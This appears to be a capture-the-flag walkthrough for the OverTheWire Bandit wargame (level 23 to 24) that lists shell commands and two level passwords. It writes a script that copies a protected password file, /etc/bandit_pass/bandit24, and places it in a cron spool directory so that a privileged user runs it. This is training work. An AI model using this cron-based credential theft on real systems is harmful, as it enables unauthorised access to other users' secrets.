[$]-> ssh bandit23@bandit.labs.overthewire.org -p 2220

[$]-> jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

[$]-> cat /usr/bin/cronjob_bandit24.sh

[$]-> mkdir /tmp/sawin

[$]-> cd /tmp/sawin

[$]-> vim password.sh

# paste the following code 
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/sawin/password


[$]-> chmod 777 password.sh

[$]-> cp password.sh /var/spool/bandit24

# give it a minute to allow to run cron job then cat

[$]-> cat password


The password for bandit24 is: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 
